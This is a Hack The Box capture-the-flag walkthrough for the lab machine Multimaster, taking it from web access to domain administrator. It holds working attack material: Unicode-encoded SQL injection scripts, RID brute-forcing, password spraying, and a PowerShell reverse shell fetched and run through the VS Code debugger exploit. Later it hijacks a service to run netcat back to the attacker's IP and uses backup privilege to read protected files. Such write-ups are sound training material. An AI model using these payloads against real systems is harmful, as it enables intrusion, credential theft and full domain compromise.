# Hack The Box - Multimaster Walkthrough

**Machine:** Multimaster  
**IP:** 10.129.95.200  
**Difficulty:** Insane  
**OS:** Windows Server 2016 / Active Directory  
**Domain:** MEGACORP.LOCAL  

---

## Table of Contents

1. [Overview](#overview)
2. [Enumeration](#enumeration)
3. [SQL Injection Discovery](#sql-injection-discovery)
4. [SQL Injection Exploitation - Dumping Hashes](#sql-injection-exploitation---dumping-hashes)
5. [Hash Cracking](#hash-cracking)
6. [RID Brute-Force via SQL Injection](#rid-brute-force-via-sql-injection)
7. [Password Spraying & Initial Foothold](#password-spraying--initial-foothold)
8. [Privilege Escalation: VS Code CVE-2019-1414](#privilege-escalation-vs-code-cve-2019-1414)
9. [Lateral Movement: cyork -> sbauer](#lateral-movement-cyork---sbauer)
10. [Lateral Movement: sbauer -> jorden (ASREPRoast)](#lateral-movement-sbauer---jorden-asreproast)
11. [Privilege Escalation to Administrator (SeBackupPrivilege)](#privilege-escalation-to-administrator-sebackupprivilege)
12. [Flags](#flags)

---

## Overview

Multimaster is an Insane-rated Windows Active Directory machine. The exploitation path is long and multi-staged:

```
SQL Injection -> Hash Dump -> RID Enumeration -> Password Spray -> WinRM (user.txt)
    -> VS Code Exploit (cyork) -> DLL Analysis -> Password Spray (sbauer)
    -> ACL Abuse/ASREPRoast (jorden) -> SeBackupPrivilege Abuse (root.txt)
```

The box heavily focuses on:
- Web application SQL injection with WAF bypass
- Active Directory enumeration via SQL injection primitives
- Hash cracking (Keccak-384)
- Local privilege escalation via VS Code CEF debugger
- Active Directory ACL abuse (GenericWrite -> ASREPRoast)
- Windows privilege abuse (SeBackupPrivilege)

---

## Enumeration

### Step 1: Add host to /etc/hosts

**Why:** Active Directory domains require proper DNS resolution for Kerberos and LDAP operations. The machine responds to `megacorp.local` and `multimaster.megacorp.local`.

```bash
sudo bash -c 'echo "10.129.95.200 multimaster.megacorp.local megacorp.local" >> /etc/hosts'
```

### Step 2: Nmap Scan

**Why:** We need to identify open ports, running services, and operating system. This machine has many AD-related ports open.

```bash
nmap -Pn -sC -sV -oN multimaster.nmap 10.129.95.200
```

**Key findings:**

| Port | Service | Notes |
|------|---------|-------|
| 53/tcp | DNS | Domain controller indicator |
| 80/tcp | IIS 10.0 | Web application (MegaCorp) |
| 88/tcp | Kerberos | Domain: MEGACORP.LOCAL |
| 389/tcp | LDAP | Active Directory LDAP |
| 445/tcp | SMB | Windows Server 2016 |
| 1433/tcp | MSSQL | SQL Server 2017 - critical for later |
| 3389/tcp | RDP | Terminal Services |
| 5985/tcp | WinRM | Remote management - our shell vector |

**Analysis:**
- Multiple domain controller ports confirm this is a DC
- HTTP on port 80 is our initial attack surface
- WinRM on 5985 means we'll likely use `evil-winrm` for shells
- MSSQL on 1433 explains why the web app uses SQL Server backend

---

## SQL Injection Discovery

### Step 3: Discover the Injection Point

**Why:** The web application has a "Colleague Finder" feature that searches employees. This is a classic attack surface for SQL injection.

Navigate to `http://10.129.95.200` and find the employee search page. It sends a POST request to `/api/getColleagues` with JSON body `{"name":"a"}`.

**Testing normal behavior:**

```bash
curl -s -X POST http://10.129.95.200/api/getColleagues \
  -H "Content-Type: application/json" \
  -d '{"name":"a"}' | python3 -m json.tool | head -20
```

Returns a JSON array of employees with fields: `id`, `name`, `position`, `email`, `src`.

**Testing for SQL injection:**

```bash
curl -s -X POST http://10.129.95.200/api/getColleagues \
  -H "Content-Type: application/json" \
  -d '{"name":"\u0027"}'
```

**Result:** `null`

**Why this matters:** The single quote (`'`) is encoded as `\u0027` (Unicode escape). The application returns `null` instead of the normal employee list, indicating the SQL query broke. This confirms SQL injection.

**WAF/Encoding context:** The application has a WAF that blocks raw quotes. Because the Content-Type is `application/json;charset=utf-8`, the server decodes Unicode escape sequences. By encoding our payload in Unicode escapes (`\u00XX`), we bypass the WAF entirely.

---

## SQL Injection Exploitation - Dumping Hashes

### Step 4: Manual UNION-Based Extraction

**Why:** We need to extract data from the database. Since it's MSSQL, we use UNION-based injection. We first determine the number of columns and which ones return data.

**Payload structure:** The original query likely looks like:
```sql
SELECT id, name, position, email, src FROM Colleagues WHERE name LIKE '%INPUT%'
```

This means there are **5 columns**, and columns 2 and 3 (`name` and `position`) return visible data.

**Python helper for Unicode encoding:**

```python
import requests
import json

url = "http://10.129.95.200/api/getColleagues"

def encode_payload(s):
    return ''.join([f'\\u{ord(c):04x}' for c in s])

# Dump usernames and passwords from Logins table
payload = "a' UNION SELECT 1,username,password,4,5 FROM Logins-- -"
data = '{"name":"' + encode_payload(payload) + '"}'
r = requests.post(url, data=data, headers={"Content-Type":"application/json"})
print(r.text)
```

**Result:** We extract 17 username/password pairs from the `Hub_DB.Logins` table.

**Why UNION SELECT works:** The original query returns 5 columns. Our `UNION SELECT 1,username,password,4,5` matches the column count. The `username` goes into the `name` field of the JSON response, and `password` goes into the `position` field.

---

## Hash Cracking

### Step 5: Identify and Crack the Hashes

**Why:** The passwords are hashed. We need plaintext passwords for password spraying against domain services (SMB/WinRM).

**Extracted hashes (unique only):**

| Hash | Username(s) |
|------|-------------|
| `9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739` | aldom, cyork, james, jorden, sbauer, shayna |
| `fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa` | alyx, nbourne, okent, rmartin |
| `68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813` | ckane, ilee, kpage, zac, zpowers |
| `cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc` | egre55, minatotw |

**Hash identification:** Using hash analyzers, these match **Keccak-384** (SHA-3 family).

**Cracking with hashcat:**

```bash
hashcat -m 17900 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O
```

**Results:**

| Hash | Password |
|------|----------|
| `9777768363...` | `password1` |
| `68d1054460...` | `finance1` |
| `fb40643498...` | `banking1` |
| `cf17bb4919...` | *(uncracked - admin accounts)* |

**Why only 3 cracked:** The 4th hash belongs to CEO accounts (`minatotw`, `egre55`) with stronger passwords not in rockyou.txt.

---

## RID Brute-Force via SQL Injection

### Step 6: Why RID Brute-Forcing?

**Why:** The usernames from the web database don't all have domain accounts. Even worse, password spraying the known users with the cracked passwords fails. We need to find **additional domain users** that aren't in the web app's database.

**Active Directory SID Structure:**
- Every AD object has a Security Identifier (SID)
- Domain SID + Relative Identifier (RID) = Full SID
- Well-known RIDs: 500 (Administrator), 512 (Domain Admins), 1000+ (domain objects)

**MSSQL Functions for AD Enumeration:**
- `SUSER_SID('DOMAIN\User')` → returns binary SID
- `SUSER_SNAME(binary_sid)` → returns username from SID
- `sys.fn_varbintohexstr()` → converts binary to hex string

### Step 7: Extract the Domain SID

```python
payload = "a' UNION SELECT 1,(select sys.fn_varbintohexstr(SUSER_SID('MEGACORP\\Administrator'))),3,4,5-- -"
```

**Result:** `0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000`

**Decoding:**
- Domain SID (first 48 bytes): `S-1-5-21-3167813660-1240564177-918740779`
- RID (last 8 bytes): `f4010000` → reversed `0x000001f4` → **500** (Administrator)

### Step 8: Brute-Force RIDs

**Why:** By iterating RIDs from 1000+ and constructing SIDs, we can discover domain users, groups, and computers not exposed by the web app.

```python
import requests
import json
from time import sleep

url = "http://10.129.95.200/api/getColleagues"

def encode_payload(s):
    return ''.join([f'\\u{ord(c):04x}' for c in s])

domain_sid = "S-1-5-21-3167813660-1240564177-918740779"

for rid in range(1000, 3001):
    sid = f"{domain_sid}-{rid}"
    payload = f"a'UNION SELECT 1,((SUSER_SNAME(SID_BINARY(N'{sid}')))),3,4,5-- -"
    data = '{"name":"' + encode_payload(payload) + '"}'
    
    try:
        r = requests.post(url, data=data, headers={"Content-Type":"application/json"}, timeout=10)
        if "MEGACORP\\\\" in r.text:
            parsed = json.loads(r.text)
            name = parsed[0]["name"] if parsed else ""
            if name and "Dns" not in name:
                print(f"  RID {rid}: {name}")
    except:
        pass
    
    sleep(2)  # WAF bypass - critical!
```

**Key discoveries:**

| RID | Object |
|-----|--------|
| 1000 | `MEGACORP\MULTIMASTER$` (domain computer) |
| 1103 | `MEGACORP\svc-nas` |
| 1105 | `MEGACORP\Privileged IT Accounts` (group) |
| 1110 | `MEGACORP\tushikikatomo` |
| 1111 | `MEGACORP\andrew` |
| 1112 | `MEGACORP\lana` |

**Why this works:** The SQL Server runs with domain account privileges, allowing it to resolve SIDs to names via Active Directory. The WAF delay (`sleep(2)`) is essential — without it, requests get blocked.

---

## Password Spraying & Initial Foothold

### Step 9: Spray New Users

**Why:** We now have new domain users and 3 cracked passwords. Password spraying uses a small password list against many users to avoid account lockout.

```bash
cat > new_users.txt << 'EOF'
tushikikatomo
andrew
lana
svc-nas
EOF

cat > passwords.txt << 'EOF'
password1
finance1
banking1
EOF

crackmapexec smb 10.129.95.200 -u new_users.txt -p passwords.txt --continue-on-success
crackmapexec winrm 10.129.95.200 -u new_users.txt -p passwords.txt --continue-on-success
```

**Results:**
- SMB: `MEGACORP.LOCAL\tushikikatomo:finance1` ✅
- WinRM: `MEGACORP.LOCAL\tushikikatomo:finance1 (Pwn3d!)` ✅

### Step 10: evil-winrm and User Flag

**Why:** WinRM (Windows Remote Management) on port 5985 is PowerShell remoting. `evil-winrm` gives us an interactive PowerShell session.

```bash
evil-winrm -i 10.129.95.200 -u tushikikatomo -p finance1
```

```powershell
cat C:\Users\alcibiades\Desktop\user.txt
```

**Result:** `f2f7bb[redacted]1ef697903`

**Note:** The user folder is `alcibiades`, not `tushikikatomo`. This happens when the user profile is mapped to a different folder name.

---

## Privilege Escalation: VS Code CVE-2019-1414

### Step 11: Discover VS Code Running

**Why:** As `tushikikatomo`, we have limited privileges. We need to find a local privilege escalation vector. Running processes show multiple `Code.exe` instances.

```powershell
Get-Process | Where-Object {$_.ProcessName -like "*Code*"}
(Get-Command "C:\Program Files\Microsoft VS Code\Code.exe").FileVersionInfo.FileVersion
```

**Result:** Version **1.37.1**

**Vulnerability Analysis:**
- VS Code versions before 1.38 are vulnerable to **CVE-2019-1414**
- VS Code's Electron/Chromium framework exposes a **CEF debugger** on `127.0.0.1` with a random port
- The debugger accepts WebSocket connections and can execute arbitrary JavaScript via Node.js's `child_process`
- Since VS Code runs as a different user (`cyork`), exploiting this gives us code execution as that user

### Step 12: Download and Use cefdebug.exe

**Why:** `cefdebug` (by Tavis Ormandy) scans for CEF debug listeners and allows connecting to them to execute code.

On Kali:
```bash
wget -q https://github.com/taviso/cefdebug/releases/download/v0.1/cefdebug.zip
unzip cefdebug.zip
```

On target (via evil-winrm):
```powershell
Invoke-WebRequest -Uri "http://10.10.17.27:8080/cefdebug/cefdebug.exe" -OutFile "cefdebug.exe"
.\cefdebug.exe
```

**Result:**
```
ws://127.0.0.1:35099/7b19d23b-1ec0-4143-8d4c-26ebd6b88583
```

### Step 13: Exploit the Debugger

**Why:** The CEF debugger runs JavaScript in VS Code's renderer process, which has access to Node.js APIs. We use `process.mainModule.require('child_process').exec()` to spawn a system command.

**Setup on Kali:**
```bash
# Terminal 1: HTTP server
python3 -m http.server 8080

# Terminal 2: Netcat listener
nc -lnvp 4444
```

**Create reverse shell script (`shell.ps1`):**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.17.27',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PSReverseShell# '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

**Exploit command:**
```powershell
.\cefdebug.exe --url ws://127.0.0.1:35099/7b19d23b-1ec0-4143-8d4c-26ebd6b88583 --code "process.mainModule.require('child_process').exec('powershell IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.17.27:8080/shell.ps1\')')"
```

**Result:** Reverse shell connects to Kali as `cyork`.

```
PSReverseShell# whoami
megacorp\cyork
```

---

## Lateral Movement: cyork -> sbauer

### Step 14: Find the Hardcoded Password

**Why:** `cyork` has read access to `C:\inetpub\wwwroot\bin\` (the web application directory). The `.dll` files may contain hardcoded credentials.

The `MultimasterAPI.dll` contains the database connection string:

```
server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;
```

**Why this exists:** Developers often hardcode credentials in compiled binaries, especially in `.config` files or connection strings embedded in DLLs.

### Step 15: Password Spray with New Password

```bash
crackmapexec smb 10.129.95.200 -u all_users.txt -p 'D3veL0pM3nT!' --continue-on-success
crackmapexec winrm 10.129.95.200 -u all_users.txt -p 'D3veL0pM3nT!' --continue-on-success
```

**Result:** `sbauer:D3veL0pM3nT!` with WinRM access.

---

## Lateral Movement: sbauer -> jorden (ASREPRoast)

### Step 16: Discover ACL Abuse Path

**Why:** `sbauer` doesn't have direct admin access. We need to find an attack path in Active Directory. Using BloodHound or manual enumeration, we discover:

- `sbauer` has **GenericWrite** over `jorden`
- `jorden` is a member of **Server Operators** (high-value group)

**GenericWrite Abuse:** GenericWrite on a user object allows us to modify non-protected attributes, including `userAccountControl`. We can set `UF_DONT_REQUIRE_PREAUTH` to make the account AS-REP roastable.

### Step 17: Enable Preauth Bypass on jorden

Connect as `sbauer`:
```bash
evil-winrm -i 10.129.95.200 -u sbauer -p 'D3veL0pM3nT!'
```

```powershell
Get-ADUser jorden | Set-ADAccountControl -doesnotrequirepreauth $true
```

**Why this works:** The `Set-ADAccountControl` cmdlet modifies the `userAccountControl` attribute. Setting `doesnotrequirepreauth` to `$true` adds the `UF_DONT_REQUIRE_PREAUTH` flag (0x400000). This tells the KDC that the user doesn't need to pre-authenticate before requesting a TGT, allowing anyone to request an AS-REP for this user.

### Step 18: ASREPRoast jorden

On Kali:
```bash
impacket-GetNPUsers -format hashcat -usersfile jorden_only.txt -dc-ip 10.129.95.200 megacorp.local/sbauer:'D3veL0pM3nT!'
```

**Why ASREPRoasting works:** Normally, Kerberos requires pre-authentication (proving knowledge of the password before getting a ticket). With `UF_DONT_REQUIRE_PREAUTH` disabled, we can request an AS-REP ticket for `jorden` without knowing the password. The AS-REP contains encrypted data that we can crack offline.

### Step 19: Crack jorden's Hash

```bash
hashcat -m 18200 jorden.hash /usr/share/wordlists/rockyou.txt
```

**Result:** `rainforest786`

---

## Privilege Escalation to Administrator (SeBackupPrivilege)

### Step 20: evil-winrm as jorden

```bash
evil-winrm -i 10.129.95.200 -u jorden -p rainforest786
```

### Step 21: Check Privileges

```powershell
whoami /priv
```

**Key privileges:**
- `SeBackupPrivilege` (Enabled)
- `SeRestorePrivilege` (Enabled)

**Why SeBackupPrivilege is powerful:**
- Members of the **Backup Operators** group (and **Server Operators**) have this privilege
- It grants **read access to ALL files**, bypassing normal ACL permissions
- When combined with backup-aware tools (like `robocopy /B`), it allows copying files the user normally cannot access

### Step 22: Copy root.txt Using Backup Mode

**Why `robocopy /B`:** The `/B` flag tells robocopy to use backup mode, which uses the `SeBackupPrivilege` to bypass file ACLs. This is a standard Windows feature designed for backup software.

```powershell
robocopy C:\Users\Administrator\Desktop C:\Users\jorden\Desktop root.txt /B
```

**Result:** The 34-byte `root.txt` is copied successfully despite `jorden` not having normal read access to `C:\Users\Administrator\Desktop`.

### Step 23: Read the Flag

```powershell
cat C:\Users\jorden\Desktop\root.txt
```

**Result:** `6fe41f[redacted]0413d08e`

---

## Alternative Root Paths

### ACL Modification Method (Writeups 1 & 2)

Instead of `robocopy`, you can also use PowerShell to directly modify ACLs:

```powershell
$user = 'MEGACORP\jorden'
$folder = 'C:\Users\Administrator'
$acl = Get-ACL $folder
$aclperms = $user, "FullControl", "ContainerInherit, ObjectInherit","None","Allow"
$aclrule = New-Object System.Security.AccessControl.FileSystemAccessRule $aclperms
$acl.AddAccessRule($aclrule)
Set-Acl -Path $folder -AclObject $acl
```

**Why this works:** `SeRestorePrivilege` allows restoring files and directories, which includes the ability to modify ACLs on any file.

### Service Hijacking Method (Writeup 2)

`jorden` (as Server Operators) can start/stop services. You can modify service binaries to get a SYSTEM shell:

```powershell
REG add HKLM\System\CurrentControlSet\Services\VSS /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\nc.exe 10.10.17.27 4445 -e cmd.exe" /f
sc.exe start VSS
```

**Why this works:** Server Operators can modify service configurations and start/stop services. When the service starts, it executes the hijacked binary as **SYSTEM**.

---

## Flags

| Flag | Location | Value |
|------|----------|-------|
| **user.txt** | `C:\Users\alcibiades\Desktop\user.txt` | `f2f7bb81[redacted]f697903` |
| **root.txt** | `C:\Users\Administrator\Desktop\root.txt` | `6fe41f[redacted]0413d08e` |

---

## Key Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port/service enumeration |
| `curl` / Python `requests` | SQL injection exploitation |
| `hashcat -m 17900` | Keccak-384 hash cracking |
| `hashcat -m 18200` | Kerberos AS-REP hash cracking |
| `crackmapexec` | Password spraying (SMB/WinRM) |
| `evil-winrm` | WinRM shell access |
| `cefdebug.exe` | VS Code CEF debugger exploitation |
| `impacket-GetNPUsers` | AS-REP roasting |
| `robocopy /B` | Backup-mode file copy (SeBackupPrivilege abuse) |

---

## Lessons Learned

1. **Unicode WAF Bypass:** JSON endpoints with `charset=utf-8` may decode `\u00XX` escape sequences before passing input to the SQL query, allowing WAF bypass.

2. **AD Enumeration via SQLi:** MSSQL's `SUSER_SID()` and `SUSER_SNAME()` functions can enumerate Active Directory objects through SQL injection, even without command execution.

3. **RID Brute-Forcing:** Domain SIDs are predictable. Brute-forcing RIDs through SQLi can reveal hidden users critical for lateral movement.

4. **CEF Debugger Exploitation:** Electron applications (like VS Code) expose powerful debug interfaces. Always check running processes for IDEs and browsers.

5. **GenericWrite -> ASREPRoast:** GenericWrite on a user is a direct path to compromise. Enabling `doesnotrequirepreauth` and AS-REP roasting is faster than targeted Kerberoasting.

6. **SeBackupPrivilege:** Don't overlook backup/restore privileges. `robocopy /B` is a simple, elegant way to read protected files without modifying ACLs or getting a full SYSTEM shell.
